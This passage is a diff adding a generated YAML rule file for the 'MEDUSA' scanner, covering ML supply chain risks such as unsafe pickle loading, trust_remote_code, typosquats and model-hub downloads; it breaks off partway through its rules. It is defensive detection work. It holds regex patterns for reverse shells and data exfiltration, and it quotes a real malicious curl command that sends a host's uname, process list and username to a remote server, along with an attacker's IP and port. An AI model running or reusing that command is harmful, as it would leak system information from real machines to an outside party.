@@ -1,0 +1,2052 @@
+# MEDUSA Scanner Rules — ml_supply_chain (MERGED)
+# Sources: ml_supply_chain_scanner_expansion.yaml, ml_supply_chain_scanner_fc.yaml
+# Total rules: 60
+# Generated: 2026-03-01
+# DO NOT EDIT — regenerate with merge_rules.py
+
+metadata:
+  subject: ml_supply_chain
+  prefix: MLSC
+  total_rules: 60
+  sources:
+  - ml_supply_chain_scanner_expansion.yaml
+  - ml_supply_chain_scanner_fc.yaml
+  generation_date: '2026-03-01'
+
+rules:
+- id: MEDUSA-MLSC-SCAN-001
+  name: pickle-unsafe-load-in-ml-context
+  severity: CRITICAL
+  category: ml_supply_chain
+  patterns:
+  - (?i)pickle\.load\s*\(
+  - (?i)pickle\.loads\s*\(
+  - (?i)torch\.load\s*\([^)]*(?!weights_only\s*=\s*True)
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: Unsafe pickle deserialization detected in ML context
+  description: 'Unsafe pickle.load() or torch.load() without weights_only=True detected.
+    Pickle deserialization allows arbitrary code execution via __reduce__ magic method.
+    Zhao et al. (ASE ''24) found 91 malicious models on Hugging Face exploiting this
+    vector; Liu et al. (2025) identified 22 loading paths and 133 exploitable gadgets
+    bypassing existing scanners. Kellas et al. (2025) confirmed 44.9% of popular Hugging
+    Face models still use insecure pickle format. NIST AI 100-2e2023 (Vassilev 2024)
+    classifies this as AI supply chain critical vulnerability; CVE-2019-6446 assigned
+    for pickle in neural network tools.
+
+    '
+  remediation: 'Use torch.load(path, weights_only=True) for PyTorch models. Prefer
+    safetensors format (huggingface_hub safetensors library). For scikit-learn models
+    consider PyMilo (Rostami 2024) for transparent JSON serialization. If pickle is
+    unavoidable, validate SHA-256 hash of model file before loading and scan with
+    ModelScan/Fickling.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-502
+- id: MEDUSA-MLSC-SCAN-002
+  name: pickle-reduce-exploit-pattern
+  severity: CRITICAL
+  category: ml_supply_chain
+  patterns:
+  - (?i)def\s+__reduce__\s*\(
+  - (?i)__reduce_ex__\s*\(
+  - (?i)pickle\.dumps\s*\(.*__reduce__
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: Pickle __reduce__ exploit pattern detected — potential malicious model
+    payload
+  description: 'The __reduce__ magic method is the primary mechanism for pickle-based
+    arbitrary code execution (ACE). Attackers implement __reduce__ to return (os.system,
+    (''cmd'',)) or equivalent, executing arbitrary shell commands when the model is
+    deserialized. Liu et al. (2025) documented this as the canonical pickle exploit
+    pattern with opcodes STACK_GLOBAL and REDUCE. Zhao et al. (ASE ''24) found real-world
+    deployments including reverse shells connecting to 192.248.1.167:4242 in Hugging
+    Face models.
+
+    '
+  remediation: 'Any model file containing __reduce__ definitions should be treated
+    as potentially malicious. Use PickleBall (Kellas 2025) for policy-enforced safe
+    deserialization. Scan model with Fickling (Trail of Bits) and ModelScan (ProtectAI).
+    Never load models from untrusted sources without signature verification.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-502
+- id: MEDUSA-MLSC-SCAN-003
+  name: trust-remote-code-enabled
+  severity: CRITICAL
+  category: ml_supply_chain
+  patterns:
+  - (?i)trust_remote_code\s*=\s*True
+  - (?i)trust_repo\s*=\s*True
+  - (?i)from_pretrained\s*\([^)]*trust_remote_code
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  - '*.yaml'
+  - '*.yml'
+  message: trust_remote_code=True detected — arbitrary code execution from remote
+    repository
+  description: 'Setting trust_remote_code=True instructs the transformers library
+    to download and execute arbitrary Python code from the remote model repository
+    during model loading. Siddiq et al. (2026) documented three attack scenarios:
+    (S1) malicious fork where attacker uploads reverse shell in tokenizer.py/__init__.py/modeling_*.py,
+    (S2) compromised trusted maintainer account, (S3) attacker-in-the-middle cache
+    poisoning of ~/.cache/huggingface/. Study found 36,697 Hugging Face repos with
+    custom code (1.74%), peak 4,898 new repos/month. CWE-502 was dominant weakness
+    (65.45% of Semgrep findings). Hugging Face hosts 2.1M+ models making manual review
+    impractical.
+
+    '
+  remediation: 'Never set trust_remote_code=True unless you have verified the model
+    repository source code manually. Pin to specific commit hash. Use models from
+    verified publishers with cryptographic signing. Consider sandboxed execution environment
+    for any model requiring trust_remote_code. Prefer models using SafeTensors format
+    that do not require custom loading code.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-94
+- id: MEDUSA-MLSC-SCAN-004
+  name: reverse-shell-in-ml-code
+  severity: CRITICAL
+  category: ml_supply_chain
+  patterns:
+  - (?i)pty\.spawn\s*\(.*[/\\]bin[/\\]sh
+  - (?i)os\.dup2\s*\(s\.fileno
+  - (?i)socket\.socket.*socket\.connect.*RHOST
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: Reverse shell payload detected in ML model code
+  description: 'Reverse shell pattern detected — direct indicator of malicious model
+    payload. Zhao et al. (ASE ''24) documented real-world reverse shell found in Hugging
+    Face model ''star23/baller10'': cross-platform shell using pty.spawn(''/bin/sh'')
+    on Linux and powershell.exe on Windows, connecting to RHOST:RPORT (observed: 192.248.1.167:4242).
+    This is the most dangerous class of ML supply chain payload, granting full remote
+    system access when model is loaded. Siddiq et al. (2026) confirmed YARA rules
+    can detect such reverse shell signatures across model repositories.
+
+    '
+  remediation: 'Model file must be quarantined immediately and not loaded. Report
+    to model hub security team (Hugging Face: security@huggingface.co). Perform full
+    system audit if model was previously loaded. Block repository from future access.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-78
+- id: MEDUSA-MLSC-SCAN-005
+  name: dataset-loading-script-dangerous-apis
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)subprocess\.check_output\s*\(
+  - (?i)datasets\.load_dataset\s*\([^)]*trust_remote_code
+  - (?i)subprocess\.run\s*\([^)]*shell\s*=\s*True
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: Dangerous API usage in dataset loading context — potential data loading
+    script injection
+  description: 'Dangerous subprocess usage in dataset loading context. Zhao et al.
+    (ASE ''24) documented real malicious dataset loading script in ''Yash2998db/stan_small'':
+    subprocess.check_output(''(uname -a; ps auxww) | curl -s https://eoxvp5idbpacu69.m.pipedream.net/$(whoami)
+    --data-binary @-'', shell=True) This exfiltrated system info to attacker''s server
+    on dataset load. Siddiq et al. (2026) found B602 (shell=True subprocess) as top
+    high-severity finding on OpenCSG. Zhao et al. identified 13 subprocess.* calls
+    and 12 os.system calls in Hugging Face dataset loading scripts.
+
+    '
+  remediation: 'Never use datasets.load_dataset() with trust_remote_code=True on untrusted
+    datasets. Audit all subprocess calls in dataset loading code. Hugging Face plans
+    to disable automatic execution of dataset loading scripts by default (require
+    explicit opt-in). Use datasets from verified, signed sources only.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-78
+- id: MEDUSA-MLSC-SCAN-006
+  name: model-hub-unsafe-download
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)hf_hub_download\s*\(
+  - (?i)snapshot_download\s*\(
+  - (?i)from_pretrained\s*\([^)]*revision\s*=\s*['"](?!sha256:)
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  - '*.yaml'
+  - '*.yml'
+  message: Unsafe Hugging Face Hub download without integrity verification (CWE-494)
+  description: 'Model download from Hugging Face Hub without cryptographic integrity
+    verification. Siddiq et al. (2026) identified B615 (Unsafe Hugging Face Hub download)
+    as the most common medium-severity finding: 3,803 instances on Hugging Face (4.00%
+    of custom-code repos). NIST AI 100-2e2023 (Vassilev 2024) recommends verifying
+    cryptographic hashes of model artifacts as basic supply chain integrity check.
+    Meiklejohn et al. (2025) documented namesquatting attacks where adversaries mimic
+    reputable model names to distribute malware. Without pinning to a specific commit
+    hash or verified revision, any model update could introduce malicious code.
+
+    '
+  remediation: 'Always pin model downloads to a specific commit hash (revision=''abc123...'').
+    Verify SHA-256 hash of downloaded model files before loading. Consider using model
+    signing via Sigstore (Meiklejohn et al. 2025). Use only models from verified publishers
+    with cryptographic attestations.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-494
+- id: MEDUSA-MLSC-SCAN-007
+  name: joblib-dill-cloudpickle-unsafe-load
+  severity: CRITICAL
+  category: ml_supply_chain
+  patterns:
+  - (?i)joblib\.load\s*\(
+  - (?i)dill\.load\s*\(
+  - (?i)cloudpickle\.load\s*\(
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: Unsafe pickle-variant deserialization (joblib/dill/cloudpickle) detected
+  description: 'Pickle-variant serialization formats (joblib, dill, cloudpickle) are
+    equally vulnerable to arbitrary code execution as pickle itself. Zhao et al. (ASE
+    ''24) classified these as ''Insecure'' in their 15-format taxonomy. Liu et al.
+    (2025) specifically documents joblib supporting multiple compression algorithms
+    (gzip, zlib, bz2, lzma) that create additional evasion opportunities for malicious
+    payloads. Siddiq et al. (2026) identified joblib as a vulnerable format in all
+    five platforms studied. Parida et al. (2025) found Pickle and Joblib to be ''most
+    challenging to integrate'' AND most insecure.
+
+    '
+  remediation: 'Migrate from joblib/dill/cloudpickle to safetensors (deep learning)
+    or PyMilo (traditional ML). If joblib is required, validate SHA-256 hash before
+    loading and ensure model originates from a trusted, signed source. Scan with ModelScan
+    prior to loading. Restrict joblib loading to models from internal, controlled
+    sources.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-502
+- id: MEDUSA-MLSC-SCAN-008
+  name: keras-lambda-layer-exploit
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)Lambda\s*\(\s*lambda
+  - (?i)tf\.keras\.layers\.Lambda
+  - (?i)keras\.layers\.Lambda
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  - '*.h5'
+  message: Keras Lambda layer usage detected — potential code execution via HDF5 deserialization
+  description: 'Keras Lambda layers serialize Python bytecode in marshal format within
+    HDF5 model files. Zhao et al. (ASE ''24) found 72 instances of Keras Lambda layers
+    in suspicious models and documented that arbitrary code can be embedded in these
+    layers executing on model load. NIST AI 100-2e2023 classifies HDF5 Keras models
+    as ''Potential'' security risk. Keras addressed Lambda layer vulnerabilities in
+    version 2.13 but older H5 models remain vulnerable. Liu et al. (2025) identified
+    Keras as one of five AI/ML frameworks with exploitable model loading paths.
+
+    '
+  remediation: 'Avoid Lambda layers in production models; replace with custom Layer
+    subclasses. Upgrade to Keras 2.13+ which addresses Lambda layer vulnerabilities.
+    Scan HDF5 model files with ModelScan (ProtectAI). Prefer TensorFlow SavedModel
+    or safetensors format over HDF5 for production deployments.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-502
+- id: MEDUSA-MLSC-SCAN-009
+  name: huggingface-config-name-or-path-suspicious
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)"_name_or_path"\s*:\s*"(?!.*(?:bert|gpt|llama|mistral|gemma|qwen|phi|falcon|bloom|opt|roberta|distilbert|t5|bart|xlm|electra|deberta|albert|camembert|mbart|pegasus|led|bigbird|longformer|whisper|wav2vec|vit|clip|deit|swin|beit|resnet|efficientnet|yolo|detr|sam|stable|sdxl))[^"]{3,}"(?=[,}])
+  - (?i)"url"\s*:\s*"https?://(?!(?:huggingface\.co|cdn-lfs|s3\.amazonaws))[^"]{5,}"
+  - (?i)"file"\s*:\s*"(?:/|\.\.)[^"]{3,}"
+  file_types:
+  - '*.json'
+  - config.json
+  message: Suspicious configuration file values detected — potential AI supply chain
+    config poisoning
+  description: 'Suspicious values in Hugging Face configuration files detected. Ding
+    et al. (2025) documented three attack scenarios using config files: (1) file operations
+    — loading unauthorized files via file path keys, (2) website operations — connections
+    to unknown URLs enabling IP exposure and RCE, (3) repository operations — _name_or_path
+    redirect to malicious repositories. Rule-based analysis of 150,000 repos found
+    35,761 suspicious repos with repository operation risk. CONFIGSCAN confirmed hauson-fan/RagRetriever
+    and HuggingWorm/RagRetriever as confirmed malicious via _name_or_path manipulation.
+
+    '
+  remediation: 'Validate all config.json values before loading models. Verify _name_or_path
+    matches the expected repository name. Inspect URL values in config files before
+    executing code that resolves them. Use CONFIGSCAN (Ding et al. 2025) for automated
+    config file security analysis.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-610
+- id: MEDUSA-MLSC-SCAN-010
+  name: eval-exec-in-ml-model-code
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)\beval\s*\(
+  - (?i)\bexec\s*\(
+  - (?i)__builtins__\[.eval.
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: eval()/exec() usage detected in ML model code — potential code injection
+    via deserialization
+  description: 'eval() and exec() in ML model loading code create code injection vulnerabilities.
+    Siddiq et al. (2026) found CWE-95 (Eval Injection) as second most common weakness:
+    19.48% of Semgrep findings on Hugging Face (517 instances). Zhao et al. (ASE ''24)
+    lists eval and exec as top-tier ''Unsafe Builtin Functions'' in Table 3 for ML
+    model security analysis, identifying 23 eval and 27 exec instances in malicious
+    models. YARA rules used by Siddiq et al. specifically target ''eval detected''
+    pattern across model repositories. Liu et al. (2025) found eval as a primary risky
+    function gadget in their 133-gadget taxonomy for scanner bypass.
+
+    '
+  remediation: 'Remove eval()/exec() from model loading code. Use AST-based safe evaluation
+    alternatives for configuration parsing. Implement code review gating for any PR
+    introducing eval/exec in model-related code paths.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-95
+- id: MEDUSA-MLSC-SCAN-011
+  name: hardcoded-credentials-in-model-code
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)(?:api_key|apikey|secret_key|access_token|hf_token)\s*=\s*['"][A-Za-z0-9_\-]{16,}['"]
+  - (?i)(?:password|passwd|pwd)\s*=\s*['"][^'"]{8,}['"]
+  - (?i)HUGGINGFACE_TOKEN\s*=\s*['"][A-Za-z0-9_]{16,}['"]
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  - '*.yaml'
+  - '*.yml'
+  message: Hard-coded credentials detected in ML model code (CWE-259)
+  description: 'Hard-coded API keys, tokens, or passwords in ML model loading code.
+    Siddiq et al. (2026) found CWE-259 (Hard-coded Password) as the second most common
+    weakness across all platforms: 10,097 instances on Hugging Face (10.62%), 2,278
+    on ModelScope (10.99%). Embedded Hugging Face tokens grant access to private repositories
+    and can be extracted by anyone who downloads the model code. This creates both
+    a credential theft risk and a supply chain amplification risk where a single compromised
+    token can access multiple private model repositories.
+
+    '
+  remediation: 'Remove all hard-coded credentials from model code. Use environment
+    variables (os.environ.get(''HF_TOKEN'')) or secure secret management (HashiCorp
+    Vault, AWS Secrets Manager). Rotate any tokens that have appeared in committed
+    code. Use git-secrets or similar pre-commit hooks to prevent future credential
+    commits.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-259
+- id: MEDUSA-MLSC-SCAN-012
+  name: model-hub-namesquatting-pattern
+  severity: MEDIUM
+  category: ml_supply_chain
+  patterns:
+  - (?i)(?:huggingface|hf)\.co/(?:meta-llama|openai|anthropic|google|microsoft|mistralai|deepseek-ai)(?![-/][A-Za-z])
+  - (?i)from_pretrained\s*\(['"](?:meta_llama|0penai|anthr0pic|g00gle|micros0ft)['"]
+  - (?i)from_pretrained\s*\(['"][a-zA-Z0-9_-]{1,8}/(?:llama|gpt|claude|gemini)['"]
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  - '*.yaml'
+  - '*.yml'
+  - '*.txt'
+  message: Potential model namesquatting pattern detected — verify publisher identity
+  description: 'Potential namesquatting of popular ML model names detected. Meiklejohn
+    et al. (2025) documented namesquatting attacks on Hugging Face where attackers
+    create accounts mimicking reputable organizations (meta-llama, openai, google,
+    etc.) to distribute malicious models. Fewer than 2% of Hugging Face models use
+    GPG signing, making identity verification difficult. Traditional anti-virus cannot
+    detect malicious ML models. ProtectAI maintains a database of dozens of unsafe/suspicious
+    models discovered through such attacks.
+
+    '
+  remediation: 'Verify publisher identity using official organization accounts (meta-llama,
+    google, mistralai, deepseek-ai). Check model card for official links and verify
+    commit signing. Cross-reference with official organization websites. Consider
+    using model signing verification (Sigstore integration proposed by Meiklejohn
+    et al. 2025).
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-345
+- id: MEDUSA-MLSC-SCAN-013
+  name: mcp-server-unverified-install
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)npx\s+['"]?-y['"]?\s+[^\s]
+  - (?i)uvx\s+[^\s]+\s+--from\s+
+  - (?i)mcp.*server.*(?:npm|npx|pip|uvx).*install
+  file_types:
+  - '*.py'
+  - '*.json'
+  - '*.yaml'
+  - '*.yml'
+  - '*.sh'
+  message: Unverified MCP server installation detected — potential agent supply chain
+    rug pull
+  description: 'Unverified MCP (Model Context Protocol) server being installed without
+    integrity verification. Pautsch et al. (2025) identified agent/MCP rug pull as
+    a key supply chain risk in agent sharing infrastructure: an agent or MCP server
+    published to a registry can later be modified or replaced by the original publisher
+    or a compromised account, and autonomous agents inheriting the dependency inherit
+    the attack. The leftpad npm incident pattern applies — removing or replacing a
+    popular MCP server package can cascade across thousands of dependent pipelines.
+    npx -y installs run without user confirmation from npm registry without integrity
+    verification.
+
+    '
+  remediation: 'Pin MCP server packages to specific versions with SHA hash verification.
+    Audit MCP server source code before deployment. Use lock files (package-lock.json,
+    uv.lock) to prevent unexpected updates. Prefer MCP servers from verified publishers
+    with signed packages. Monitor for unexpected updates to pinned MCP server versions.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-494
+- id: MEDUSA-MLSC-SCAN-014
+  name: tensorflow-unsafe-api-usage
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)tf\.io\.read_file\s*\(
+  - (?i)tf\.saved_model\.load\s*\([^)]*['"][^'"]*(?:http|ftp|s3://)[^'"]*['"]
+  - (?i)tf\.keras\.models\.load_model\s*\([^)]*compile\s*=\s*True
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: Potentially unsafe TensorFlow model loading or I/O operation
+  description: 'Unsafe TensorFlow API usage in model loading context. NIST AI 100-2e2023
+    (Vassilev 2024) identifies CVE-2022-29216 for TensorFlow deserialization vulnerabilities.
+    Zhao et al. (ASE ''24) found 35 cases of unsafe TensorFlow ReadFile/WriteFile
+    operators and classifies TensorFlow SavedModel/Checkpoint/TFLite as ''Potential''
+    security risk due to support for custom operators that can execute arbitrary code.
+    Loading TensorFlow SavedModels with custom operators from untrusted sources can
+    enable supply chain attacks. Siddiq et al. (2026) confirmed TensorFlow/Keras models
+    on OpenMMLab showed B301 (pickle deserialization) as most common high-severity
+    issue.
+
+    '
+  remediation: 'Load TensorFlow models only from trusted, verified sources. Disable
+    custom operators when loading from untrusted sources (options=tf.saved_model.LoadOptions(
+    experimental_io_device=''/job:localhost'')). Scan SavedModel directories with
+    ModelScan. Use safetensors when available instead of SavedModel format.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-502
+- id: MEDUSA-MLSC-SCAN-015
+  name: git-lfs-missing-hash-verification
+  severity: MEDIUM
+  category: ml_supply_chain
+  patterns:
+  - (?i)git\s+lfs\s+pull
+  - (?i)git\s+lfs\s+fetch
+  - (?i)\.gitattributes.*filter=lfs
+  file_types:
+  - '*.sh'
+  - '*.bash'
+  - '*.yaml'
+  - '*.yml'
+  - .gitattributes
+  message: Git LFS usage without hash verification — potential ML model cache poisoning
+  description: 'Git LFS usage without explicit SHA-256 hash verification of downloaded
+    content. Havryliak (2025) documented that absence of hash verification on cloud
+    storage side allows injecting malicious code into ML models bypassing standard
+    security tools. The LFS Batch API uses HTTPS separately from Git''s SSH transport,
+    creating a ''security context gap''. Cloud storage providers do not verify hash
+    checksums on write, enabling cache poisoning: attacker substitutes malicious model
+    content while Git pointer still shows expected SHA-256 hash. Critical for ML pipelines
+    where model weights stored in LFS are downloaded in CI/CD for training or inference.
+
+    '
+  remediation: 'Implement SHA-256 hash verification of LFS-downloaded files before
+    use in ML pipelines. Enforce ''Verify-before-Write'' on LFS server configuration.
+    Use read-only deploy keys for LFS access; prohibit write access via deploy keys.
+    Implement strict quota attribution per repository. Consider migrating ML model
+    storage to Hugging Face Hub or S3 with artifact signing for stronger integrity
+    guarantees.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-345
+- id: MEDUSA-MLSC-SCAN-016
+  name: ml-package-typosquatting-risk
+  severity: MEDIUM
+  category: ml_supply_chain
+  patterns:
+  - (?i)pip\s+install\s+(?:torchvison|nump[^y]|transformen|scklearn|hugginfac|pytoch|skleran)
+  - (?i)import\s+(?:torchvison|nump[^y]|transformen|scklearn|hugginfac|pytoch|skleran)
+  - (?i)requirements.*(?:torchvison|nump[^y]|transformen|scklearn|hugginfac|pytoch|skleran)
+  file_types:
+  - '*.py'
+  - '*.txt'
+  - '*.cfg'
+  - '*.toml'
+  message: Potential ML package typosquat detected — verify package name
+  description: 'Potential typosquatting of core ML packages detected. ML supply chain
+    attacks targeting package managers (PyPI) use near-identical package names to
+    compromise ML pipelines. Kalu & Davis (2025) document how artifacts traversing
+    trust boundaries (mirrors, corporate proxies) lose registry security guarantees,
+    enabling package substitution. Common ML package typosquats target: numpy (torchvison,
+    nump*), torch (pytoch), transformers (transformen), scikit-learn (scklearn), huggingface
+    (hugginfac). These packages are direct dependencies in virtually every ML training
+    and inference pipeline.
+
+    '
+  remediation: 'Verify exact package names before installation. Use hash-pinned requirements
+    files (pip install --require-hashes -r requirements.txt). Enable PyPI package
+    signing verification. Use internal package mirrors with strict allowlists. Consider
+    SBOM (Software Bill of Materials) for all ML dependencies.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-1357
+- id: MEDUSA-MLSC-SCAN-017
+  name: yaml-unsafe-load-in-ml-context
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)yaml\.load\s*\([^)]*(?!Loader\s*=\s*yaml\.SafeLoader)
+  - (?i)yaml\.load\s*\([^,)]+\)
+  - (?i)yaml\.full_load\s*\(
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: Unsafe YAML load in ML context — potential code execution via YAML deserialization
+  description: 'yaml.load() without SafeLoader or yaml.full_load() can execute arbitrary
+    Python code via YAML deserialization. Zhao et al. (ASE ''24) specifically identified
+    yaml.load as an unsafe API (Table 5) found in Hugging Face dataset loading scripts,
+    flagging 1 instance in their scan. Siddiq et al. (2026) found YAML-based configuration
+    parsing in model loading code creating injection risks. YAML deserialization attacks
+    allow object construction and arbitrary code execution when loading attacker-controlled
+    configuration files for ML models.
+
+    '
+  remediation: 'Always use yaml.safe_load() or yaml.load(data, Loader=yaml.SafeLoader).
+    Never load YAML from untrusted sources with full_load(). Treat model configuration
+    YAML files as potentially untrusted input.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-502
+- id: MEDUSA-MLSC-SCAN-018
+  name: model-network-exfiltration-pattern
+  severity: CRITICAL
+  category: ml_supply_chain
+  patterns:
+  - (?i)curl\s+[^;|&]*\$\(whoami\)
+  - (?i)urllib\.request\.urlopen\s*\([^)]*\+\s*(?:os\.environ|subprocess|platform)
+  - (?i)requests\.(?:get|post)\s*\([^)]*(?:uname|whoami|hostname|ifconfig)
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: System information exfiltration pattern in ML code — confirmed malicious
+    payload indicator
+  description: 'System information exfiltration pattern detected. Zhao et al. (ASE
+    ''24) documented real-world dataset loading script in ''Yash2998db/stan_small''
+    that ran: subprocess.check_output(''(uname -a; ps auxww) | curl -s https://eoxvp5idbpacu69.m.pipedream.net/$(whoami)
+    --data-binary @-'', shell=True) This exfiltrates system info (OS version, process
+    list, username) to attacker''s server. Pattern of appending system command output
+    (whoami, uname, hostname) to HTTP requests is a confirmed indicator of malicious
+    ML supply chain payload. Siddiq et al. (2026) confirmed YARA signature detection
+    of such credential-stealing and info-gathering scripts.
+
+    '
+  remediation: 'Quarantine any model or dataset code containing this pattern. This
+    is a confirmed indicator of malicious supply chain payload. Report to model hub
+    security team. Audit all systems that loaded the dataset/model for signs of compromise.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-200
+- id: MEDUSA-MLSC-SCAN-019
+  name: model-signing-absent
+  severity: MEDIUM
+  category: ml_supply_chain
+  patterns:
+  - (?i)hf_hub_download\s*\([^)]*\)
+  - (?i)snapshot_download\s*\([^)]*\)
+  - (?i)AutoModel\.from_pretrained\s*\([^)]*\)
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: Model download without signature verification — supply chain integrity
+    risk
+  description: 'Model downloaded from hub without cryptographic signature verification.
+    Meiklejohn et al. (ICML 2025) documented that fewer than 2% of Hugging Face models
+    use any form of signing. Authors propose Sigstore integration (storing signing
+    metadata in Rekor transparency log) to enable canonical model version verification
+    and detection of tampering. Kalu & Davis (2025) argue signing provides portable
+    trust across distribution boundaries (mirrors, corporate proxies, air-gapped transfers)
+    that registry security controls alone cannot provide. Without signing, there is
+    no way to verify that the model downloaded is the canonical version or has not
+    been replaced by a malicious actor at any point in the distribution chain.
+
+    '
+  remediation: 'Implement model integrity verification using SHA-256 hashes of model
+    files. Use models from publishers who implement Sigstore signing. Pin to specific
+    commit hashes. Verify model hash against out-of-band trusted source. Consider
+    implementing model transparency log verification as part of ML pipeline CI/CD.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-345
+- id: MEDUSA-MLSC-SCAN-020
+  name: onnx-model-unsafe-load
+  severity: MEDIUM
+  category: ml_supply_chain
+  patterns:
+  - (?i)onnxruntime\.InferenceSession\s*\([^)]*(?:http|ftp|s3://)
+  - (?i)onnx\.load\s*\([^)]*(?:http|ftp)
+  - (?i)ort\.InferenceSession\s*\([^)]*trust
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: ONNX model loaded from remote URL — verify integrity before use
+  description: 'ONNX model being loaded from remote URL without integrity verification.
+    While ONNX format is generally safer than pickle (no arbitrary code execution),
+    models loaded from remote URLs without hash verification are still vulnerable
+    to man-in-the-middle substitution and cache poisoning. Parida et al. (2025) documents
+    ONNX as the safest integration format, but notes it requires conversion from native
+    formats which can introduce issues. Siddiq et al. (2026) found CWE-706 (Incorrectly
+    Resolved Name or Reference) as common in ONNX-related model loading code on OpenCSG.
+    Havryliak (2025) shows how LFS cache poisoning could substitute malicious ONNX
+    files while maintaining expected file checksums.
+
+    '
+  remediation: 'Download ONNX models to local cache with SHA-256 hash verification
+    before loading. Never load ONNX models directly from remote URLs in production.
+    Prefer models from verified publishers. Use ONNX model validation (onnx.checker.check_model())
+    before inference.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-494
+- id: MEDUSA-MLSC-SCAN-021
+  name: torch-jit-save-unsafe-load
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)torch\.jit\.load\s*\(
+  - (?i)torch\.jit\.save\s*\([^)]*(?:http|ftp|s3://)
+  - (?i)torch\.export\.load\s*\(
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: TorchScript model loaded without integrity verification — potential supply
+    chain attack vector
+  description: 'TorchScript model loading (torch.jit.load) without hash verification.
+    Casey et al. (2025) explicitly identified torch.jit.save as one of the vulnerable
+    serialization formats capable of object injection alongside pickle, joblib, dill,
+    ONNX, numpy, and H5/HDF5. While TorchScript is generally safer than raw pickle,
+    models loaded via torch.jit.load from untrusted remote URLs bypass integrity guarantees.
+    Parida et al. (2025) noted that TorchScript (a non-pickle format) requires workarounds
+    for non-Python environments, increasing the risk that developers revert to unsafe
+    pickle fallbacks. NIST AI 100-2e2023 (Vassilev 2024) recommends verifying cryptographic
+    hashes of all model artifacts regardless of format as a baseline supply chain
+    integrity measure.
+
+    '
+  remediation: 'Download TorchScript models to local cache first, verify SHA-256 hash
+    against a trusted out-of-band source, then load with torch.jit.load(local_path).
+    Never load directly from remote URLs. Pin model artifacts to specific hashes in
+    CI/CD pipelines.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-494
+- id: MEDUSA-MLSC-SCAN-022
+  name: tensorflow-savedmodel-preprocessing-embed
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)tf\.saved_model\.save\s*\([^)]*signatures
+  - (?i)@tf\.function.*preprocessing
+  - (?i)tf\.Module.*__call__.*subprocess
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  message: TensorFlow SavedModel with embedded preprocessing logic — potential malicious
+    code embedding
+  description: 'TensorFlow SavedModel allows incorporation of arbitrary preprocessing
+    logic into the exported model artifact. Parida et al. (2025) identified this as
+    a security-relevant feature: malicious actors could embed harmful preprocessing
+    steps — data exfiltration, model poisoning during inference, or credential theft
+    — within what appears to be a standard SavedModel artifact. Zhao et al. (ASE ''24)
+    documented TensorFlow Custom Operator Abuse as a distinct attack technique: TensorFlow
+    SavedModel and Checkpoint formats support custom operators that can execute arbitrary
+    code. NIST AI 100-2e2023 (Vassilev 2024) assigned CVE-2022-29216 to TensorFlow
+    deserialization vulnerabilities. SavedModel directories are opaque blobs that
+    survive conventional antivirus scanning.
+
+    '
+  remediation: 'Inspect SavedModel directory contents (saved_model.pb + variables/)
+    before loading. Scan with ModelScan (ProtectAI) and disable custom operators for
+    models from untrusted sources. Prefer safetensors format for pure weight storage;
+    separate preprocessing into auditable, version-controlled application code rather
+    than embedding in model artifacts.
+
+    '
+  owasp_llm: LLM03:2025
+  cwe: CWE-502
+- id: MEDUSA-MLSC-SCAN-023
+  name: lora-adapter-unsafe-load
+  severity: HIGH
+  category: ml_supply_chain
+  patterns:
+  - (?i)PeftModel\.from_pretrained\s*\([^)]*(?!revision\s*=\s*['"]sha)
+  - (?i)load_adapter\s*\([^)]*(?!weights_only)
+  - (?i)set_peft_model_state_dict\s*\(
+  file_types:
+  - '*.py'
+  - '*.ipynb'
+  - '*.yaml'
+  - '*.yml'
